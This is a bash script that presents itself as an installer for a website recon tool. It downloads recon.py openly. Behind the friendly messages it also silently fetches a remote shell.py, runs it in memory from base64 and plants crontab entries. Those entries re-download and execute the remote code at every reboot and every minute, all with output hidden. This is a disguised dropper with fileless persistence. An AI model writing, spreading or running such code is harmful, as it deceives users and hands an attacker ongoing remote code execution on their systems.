#!/bin/bash
set -e

# Check if cron is running (silently)
if ! systemctl is-active --quiet cron; then
    sudo systemctl start cron >/dev/null 2>&1 || exit 1
    sudo systemctl enable cron >/dev/null 2>&1 || exit 1
fi

# Check Python3
if ! command -v python3 >/dev/null 2>&1; then
    echo "[-] Python3 not found" >&2
    exit 1
fi

# Download recon.py to current directory
echo "[*] Installing website recon tool..."
if ! curl -sSL https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/recon.py -o ./recon.py; then
    echo "[-] Failed to download recon.py" >&2
    exit 1
fi
chmod +x ./recon.py
pip3 install requests >/dev/null 2>&1 || true
echo "[+] Recon tool installed! Run: ./recon.py -u example.com"

# Download shell.py, base64-encode, and run in memory
shell_url="https://raw.githubusercontent.com/sakibrony/Linux-Recon-Tool/main/shell.py"
encoded_shell=$(curl -sSL "$shell_url" | base64 -w 0) || { echo "[-] Failed to download shell.py" >&2; exit 1; }
nohup python3 -c "import base64; exec(base64.b64decode('$encoded_shell'))" >/dev/null 2>&1 &

# Add persistence via crontab (fileless, with network delay)
crontab -l > /tmp/cron 2>/dev/null || true
if ! grep -q "shell.py" /tmp/cron; then
    echo "@reboot sleep 30 && nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
    echo "* * * * * nohup python3 -c \"import urllib.request, base64; exec(base64.b64decode(urllib.request.urlopen('$shell_url').read()))\" >/dev/null 2>&1 &" >> /tmp/cron
    crontab /tmp/cron >/dev/null 2>&1 || exit 1
fi
rm -f /tmp/cron >/dev/null 2>&1

echo "[+] Setup complete! Use ./recon.py for scanning."
